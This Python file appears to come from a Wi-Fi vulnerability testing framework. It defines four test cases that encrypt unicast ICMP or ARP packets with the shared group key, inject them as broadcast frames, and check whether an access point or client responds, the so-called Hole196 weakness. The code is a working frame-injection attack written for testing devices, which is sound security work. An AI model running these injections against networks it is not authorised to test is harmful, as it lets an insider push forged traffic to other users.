# Import dependencies and libraries.
from dependencies.libwifi.wifi import *
from library.testcase import Trigger, Action, Test
from dependencies.libwifi.crypto import encrypt_ccmp

class GroupToAp(Test):
	"""Send a group-addressed frame towards the AP. Tested against RT-AC51U running Padavan firmware."""
	name = "group-tods"
	kind = Test.Supplicant

	def __init__(self):
		"""Initialization of the sequential actions defining the test case."""
		super().__init__([
			# First get an IP so we can easily test the attack.
			Action(trigger=Trigger.Connected, action=Action.GetIp),

			# After that inject unicast ICMP ping in multiple broadcast frames.
			Action(trigger=Trigger.Connected, action=Action.Function),

			# Monitor for ICMP ping replies to our IP address.
			Action(trigger=Trigger.NoTrigger, action=Action.Receive),

			# Stop the test case once a reply has been received.
			Action(trigger=Trigger.Received, action=Action.Terminate)
		])


	def inject_as_group(self, station):
		# Against the RT-AC51U addr3 had to be the BSS for encrypted frames. This means at the Ethernet
		# layer the AP will process the frame. And at the IP layer the frame is then forwarded to the client.
		# (Strangely, with plaintext frames addr3 could be the final destination. Might be due to how the
		#  AP looks for the key that must be used to decrypted it? Or are clients directly process the
		#  plaintext frame in that case?)
		header = station.get_header()
		header.addr1 = "ff:ff:ff:ff:ff:ff"
		header.addr2 = station.mac
		header.addr3 = station.bss

		# Using a non-default TID means there's a higher chance that the Packet Number is still valid
		header.TID = 2
		# Another extra measure to make sure the Packet Number will be valid
		station.gtk_seq += 50

		# We need to set to-DS so the AP *might* process broadcast frames. This also prevents clients
		# from directly processing the broadcast frames (we want clients to ignore the inject frame
		# because we are testing the AP!).
		header.FCfield = "to-DS"

		# FIXME: Take into account the actual netmask of the network
		ipaddr = station.peerip.split(".")
		for i in range(1, 255):
			ipaddr[3] = str(i)
			frame = header/LLC()/SNAP()/IP(src=station.ip, dst=".".join(ipaddr))/ICMP()/Raw(b"icmp_ping_test")

			if i == 1:
				log(STATUS, "Will inject encrypted frames of the form: " + repr(frame))

			# FIXME: The framework doesn't disable hardware encryption, is this an issue?
			frame = encrypt_ccmp(frame, station.gtk, station.gtk_seq, keyid=station.gtk_idx)
			station.inject_mon(frame)

			station.gtk_seq += 5

		log(STATUS, f"Done injecting. Used GTK={station.gtk} with last PN={station.gtk_seq}")


	def receive(self, station, frame):
		if ICMP in frame and frame[IP].dst == station.ip and frame[ICMP].type == 0 \
			and b"icmp_ping_test" in raw(frame):
			log(STATUS, f"Received frame: " + repr(frame))
			log(STATUS, "Got an ICMP reply!", color="green")
			return True


	def generate(self, station):
		"""Generate the test case by configuring the defined actions."""
		self.actions[1].set_function(self.inject_as_group)
		self.actions[2].set_receive(self.receive, eth=True)
		self.actions[3].set_terminate(delay=1)


class GroupToClient(Test):
	"""Send a unicast ICMP ping inside a broadcast data frame."""
	name = "group-hole196"
	kind = Test.Authenticator

	def __init__(self):
		"""Initialization of the sequential actions defining the test case."""
		super().__init__([
			# Wait on the supplicant to get an IP address.
			Action(trigger=Trigger.Connected, action=Action.GetIp),

			# After that inject unicast ICMP ping in multiple broadcast frames.
			Action(trigger=Trigger.Connected, action=Action.Function),

			# Monitor for ICMP ping replies to our IP address.
			Action(trigger=Trigger.NoTrigger, action=Action.Receive),

			# Stop the test case once a reply has been received.
			Action(trigger=Trigger.Received, action=Action.Terminate)
		])


	def inject_as_group(self, station):
		frame = Ether(dst="ff:ff:ff:ff:ff:ff", src=station.mac)/IP(src=station.ip, dst=station.peerip)/ICMP()/Raw(b"icmp_ping_test")
		log(STATUS, "Injecting frame: " + repr(frame))

		for i in range(6):
			station.inject_eth(frame)
			# Against some devices we need to be fast with sending the frame, to assure it
			# arrives before the client enters sleep mode. Against others we need to be slow,
			# to assure it has configured the IP address first. This sleep provides a balance
			# between injecting fast and also slow. Since group-addressed frames don't get
			# ACK'ed/retransmitted, sending it multiple times also increases reliability.
			time.sleep(i * 0.1)

		self.inject_as_group_manual(station)
		log(STATUS, f"Done injecting. Used GTK={station.gtk} with PN={station.gtk_seq}")


	def inject_as_group_manual(self, station):
		"""This is to demonstrate and confirm the usage of the GTK as the AP"""
		header = station.get_header()
		header.addr1 = "ff:ff:ff:ff:ff:ff"
		header.addr2 = station.mac
		header.addr3 = "ff:ff:ff:ff:ff:ff"
		header.FCfield = "from-DS"

		# Using a non-default TID means there's a higher chance that the Packet Number is still valid
		header.TID = 2
		# Another extra measure to make sure the Packet Number will be valid
		station.gtk_seq += 50

		frame = header/LLC()/SNAP()/IP(src=station.ip, dst=station.peerip)/ICMP()/Raw(b"icmp_ping_test")
		frame = encrypt_ccmp(frame, station.gtk, station.gtk_seq, keyid=station.gtk_idx)
		log(STATUS, "Injecting frame: " + repr(frame))

		# Inject multiple times because broadcast frames don't get acked/retransmitted
		for i in range(5):
			station.inject_mon(frame)


	def receive(self, station, frame):
		if ICMP in frame and frame[IP].dst == station.ip and frame[ICMP].type == 0 \
			and b"icmp_ping_test" in raw(frame):
			log(STATUS, f"Received frame: " + repr(frame))
			log(STATUS, "Got an ICMP reply!", color="green")
			return True


	def generate(self, station):
		"""Generate the test case by configuring the defined actions."""
		self.actions[1].set_function(self.inject_as_group)
		self.actions[2].set_receive(self.receive, eth=True)
		self.actions[3].set_terminate(delay=1)


class GroupToClientArp6(Test):
	"""Send a unicast ARP packet inside a broadcast data frame."""
	name = "group-hole196-ipv6"
	kind = Test.Authenticator

	def __init__(self):
		"""Initialization of the sequential actions defining the test case."""
		super().__init__([
			# Wait on the supplicant to get an IP address.
			Action(trigger=Trigger.Connected, action=Action.GetIp6),

			# After that inject unicast ICMP ping in multiple broadcast frames.
			Action(trigger=Trigger.Connected, action=Action.Function),

			# Monitor for ICMP ping replies to our IP address.
			Action(trigger=Trigger.NoTrigger, action=Action.Receive),

			# Stop the test case once a reply has been received.
			Action(trigger=Trigger.Received, action=Action.Terminate)
		])


	def inject_as_group(self, station):
		frame = Ether(dst="ff:ff:ff:ff:ff:ff", src=station.mac) \
				/ IPv6(src=station.ip, dst=station.peerip) \
				/ ICMPv6EchoRequest() \
				/ Raw(b"icmp_ping_test")
		log(STATUS, "Injecting frame: " + repr(frame))

		for i in range(6):
			frame[ICMPv6EchoRequest].id = i
			station.inject_eth(frame)
			# Against some devices we need to be fast with sending the frame, to assure it
			# arrives before the client enters sleep mode. Against others we need to be slow,
			# to assure it has configured the IP address first. This sleep provides a balance
			# between injecting fast and also slow. Since group-addressed frames don't get
			# ACK'ed/retransmitted, sending it multiple times also increases reliability.
			time.sleep(i * 0.1)

		log(STATUS, f"Done injecting, encapsulation and encryption was offloaded to kernel")


	def receive(self, station, frame):
		if ICMPv6EchoReply in frame and frame[IPv6].dst == station.ip \
			and b"icmp_ping_test" in raw(frame):
			log(STATUS, f"Received frame: " + repr(frame))
			log(STATUS, "Got an ICMP reply!", color="green")
			return True


	def generate(self, station):
		"""Generate the test case by configuring the defined actions."""
		self.actions[1].set_function(self.inject_as_group)
		self.actions[2].set_receive(self.receive, eth=True)
		self.actions[3].set_terminate(delay=1)


class GroupToClientArp(Test):
	"""Send a unicast ARP packet inside a broadcast data frame."""
	name = "group-arp-unicast"
	kind = Test.Authenticator

	def __init__(self):
		"""Initialization of the sequential actions defining the test case."""
		super().__init__([
			# Wait on the supplicant to get an IP address.
			Action(trigger=Trigger.Connected, action=Action.GetIp),

			# After that inject unicast ICMP ping in multiple broadcast frames.
			Action(trigger=Trigger.Connected, action=Action.Function),

			# Monitor for ICMP ping replies to our IP address.
			Action(trigger=Trigger.NoTrigger, action=Action.Receive),

			# Stop the test case once a reply has been received.
			Action(trigger=Trigger.Received, action=Action.Terminate)
		])


	def inject_as_group(self, station):
		frame = Ether(dst="ff:ff:ff:ff:ff:ff", src=station.mac) \
				/ARP(hwsrc=station.mac, psrc=station.ip, hwdst=station.peermac, pdst=station.peerip)
		log(STATUS, "Injecting frame: " + repr(frame))

		for i in range(6):
			station.inject_eth(frame)
			# Against some devices we need to be fast with sending the frame, to assure it
			# arrives before the client enters sleep mode. Against others we need to be slow,
			# to assure it has configured the IP address first. This sleep provides a balance
			# between injecting fast and also slow. Since group-addressed frames don't get
			# ACK'ed/retransmitted, sending it multiple times also increases reliability.
			time.sleep(i * 0.1)

		log(STATUS, f"Done injecting, encapsulation and encryption was offloaded to kernel")


	def receive(self, station, frame):
		if ARP in frame and frame[ARP].op == 2 \
		    and frame[ARP].hwsrc == station.peermac and frame[ARP].psrc == station.peerip \
		    and frame[ARP].hwdst == station.mac and frame[ARP].pdst == station.ip:
			log(STATUS, f"Received frame: " + repr(frame))
			log(STATUS, "Got an ARP reply!", color="green")
			return True


	def generate(self, station):
		"""Generate the test case by configuring the defined actions."""
		self.actions[1].set_function(self.inject_as_group)
		self.actions[2].set_receive(self.receive, eth=True)
		self.actions[3].set_terminate(delay=1)

